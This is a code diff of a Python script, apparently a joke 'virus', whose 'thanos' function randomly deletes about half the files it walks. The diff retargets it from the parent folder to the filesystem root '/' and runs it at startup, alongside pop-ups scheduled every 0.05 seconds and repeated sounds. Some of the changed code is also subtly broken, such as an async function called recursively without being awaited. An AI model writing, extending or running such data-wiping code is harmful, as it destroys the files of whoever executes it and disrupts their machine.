@@ -67,20 +67,20 @@ def sound():
     playsound('sound'+ str(soundnb) + '.mp3', 0)
 
 async def thanos(dossier):
-    for nom_fichier in os.listdir(dossier):
-        chemin_fichier = os.path.join(dossier, nom_fichier)
-        if nom_fichier != 'virus':
-            if os.path.isdir(chemin_fichier):
-                thanos(chemin_fichier)
+    for nom_fichier in os.scandir(dossier):
+        if nom_fichier.name != 'virus':
+            if nom_fichier.is_dir():
+                print('call')
+                thanos(nom_fichier.path)
+                os.remove(nom_fichier.path)
             else:
-                if os.path.isfile(os.path.join(dossier, nom_fichier)):
-                    delete = randomNumber(0, 1)
-                    if(delete == 0):
-                        print('delete')
-                        os.chmod(chemin_fichier, 0o644)
-                        os.remove(chemin_fichier)
-                    else:
-                        print('keep')    
+                delete = randomNumber(0,1)
+                if delete == 0:
+                    print('delete ' + nom_fichier.path)
+                    os.chmod(nom_fichier.path, 0o644)
+                    os.remove(nom_fichier.path)
+                else:
+                    print('keep')
 
 schedule.every(0.05).seconds.do(popUps)
 schedule.every(50).to(75).seconds.do(sound)
@@ -89,7 +89,8 @@ schedule.every(1.28).minutes.do(bgSound)
 schedule.every(10).seconds.do(thanos)
 
 bgSound()
+asyncio.run(thanos('/'))
 while True:
     schedule.run_pending()
-    asyncio.run(thanos('../'))
+    
 
